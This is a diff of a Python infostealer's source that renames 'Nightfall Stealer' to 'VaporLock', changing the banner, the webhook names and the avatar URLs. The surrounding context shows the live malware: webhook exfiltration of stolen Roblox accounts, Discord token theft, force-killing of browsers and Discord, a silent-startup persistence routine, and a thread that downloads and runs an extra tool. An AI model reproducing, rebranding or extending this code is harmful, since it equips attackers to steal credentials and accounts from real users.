@@ -29,18 +29,16 @@ WORK_DIR = os.path.join(TEMP, f"NF_{random.randint(10000, 99999)}")
 os.makedirs(WORK_DIR, exist_ok=True)
 
 NIGHTFALL_ASCII = """
-__________________________________________
-|        _       _     _    __       _ _ |
-|  _ __ (_) __ _| |__ | |_ / _| __ _| | ||
-| | '_ \| |/ _` | '_ \| __| |_ / _` | | ||
-| | | | | | (_| | | | | |_|  _| (_| | | ||
-| |_| |_|_|\\__, |_| |_|\\__|_|  \\__,_|_|_||
-|  | |    _|___/ __   | |_ ___  _ __     |
-| / __)  / _ \\| '_ \\  | __/ _ \\| '_ \\    |
-| \\__ \\ | (_) | | | | | || (_) | |_) |   |
-| (   /  \\___/|_| |_|  \\__\\___/| .__/    |
-|  |_|                         |_|       |
-|________________________________________|
+ ___      ___ ________  ________  ________  ________  ___       ________  ________  ___  __       
+|\  \    /  /|\   __  \|\   __  \|\   __  \|\   __  \|\  \     |\   __  \|\   ____\|\  \|\  \     
+\ \  \  /  / | \  \|\  \ \  \|\  \ \  \|\  \ \  \|\  \ \  \    \ \  \|\  \ \  \___|\ \  \/  /|_   
+ \ \  \/  / / \ \   __  \ \   ____\ \  \\\  \ \   _  _\ \  \    \ \  \\\  \ \  \    \ \   ___  \  
+  \ \    / /   \ \  \ \  \ \  \___|\ \  \\\  \ \  \\  \\ \  \____\ \  \\\  \ \  \____\ \  \\ \  \ 
+   \ \__/ /     \ \__\ \__\ \__\    \ \_______\ \__\\ _\\ \_______\ \_______\ \_______\ \__\\ \__\
+    \|__|/       \|__|\|__|\|__|     \|_______|\|__|\|__|\|_______|\|_______|\|_______|\|__| \|__|
+                                                                                                  
+                                                                                                  
+                                                                                                  
 """
 
 def get_ip():
@@ -54,7 +52,7 @@ def send_embed(title, desc="", color=0x191919, fields=None, files=None, thumbnai
         "title": title,
         "color": color,
         "timestamp": datetime.utcnow().isoformat(),
-        "footer": {"text": "Nightfall Stealer", "icon_url": "https://files.catbox.moe/nt0b4j.png"},
+        "footer": {"text": "VaporLock", "icon_url": "https://files.catbox.moe/6zae8q.png"},
     }
     
     if desc:
@@ -70,8 +68,8 @@ def send_embed(title, desc="", color=0x191919, fields=None, files=None, thumbnai
         embed["image"] = {"url": image}
     
     payload = {
-        "username": "Nightfall Stealer", 
-        "avatar_url": "https://files.catbox.moe/nt0b4j.png", 
+        "username": "VaporLock", 
+        "avatar_url": "https://files.catbox.moe/6zae8q.png", 
         "embeds": [embed]
     }
     
@@ -228,7 +226,7 @@ def process_roblox_accounts(cookies_list):
                     "description": description[:4096],
                     "color": 0x00ff88,
                     "timestamp": datetime.utcnow().isoformat(),
-                    "footer": {"text": "Nightfall Stealer"},
+                    "footer": {"text": "VaporLock Stealer"},
                     "fields": [
                         {"name": "🆔 User ID", "value": f"`{user_info['id']}`", "inline": True},
                         {"name": "💰 Robux", "value": f"**{user_info['robux']:,}**", "inline": True},
@@ -239,8 +237,8 @@ def process_roblox_accounts(cookies_list):
                     embed["thumbnail"] = {"url": user_info['avatar_url']}
                 
                 payload = {
-                    "username": "Nightfall Stealer",
-                    "avatar_url": "https://files.catbox.moe/nt0b4j.png",
+                    "username": "VaporLock Stealer",
+                    "avatar_url": "https://files.catbox.moe/6zae8q.png",
                     "embeds": [embed]
                 }
                 
@@ -273,8 +271,8 @@ def process_roblox_accounts(cookies_list):
             with open(path, "rb") as f:
                 files = {"file": (fname, f, "text/plain")}
                 payload = {
-                    "username": "Nightfall Stealer",
-                    "avatar_url": "https://files.catbox.moe/nt0b4j.png",
+                    "username": "VaporLock",
+                    "avatar_url": "https://files.catbox.moe/6zae8q.png",
                     "embeds": [{
                         "title": "📦 Roblox Archive",
                         "description": f"**{len(roblox_accounts)}** account(s) saved",
@@ -897,7 +895,7 @@ def add_silent_startup():
 
 def main():
     subprocess.call("taskkill /f /im discord.exe /im chrome.exe /im brave.exe /im msedge.exe /im opera.exe /im operagx.exe /im firefox.exe >nul 2>&1", shell=True)
-    send_embed("Nightfall Stealer Started")
+    send_embed("VaporLock Started")
     threading.Thread(target=download_and_run_chromelevator, daemon=True).start()
     threads = [
         threading.Thread(target=steal_discord_tokens, daemon=True),
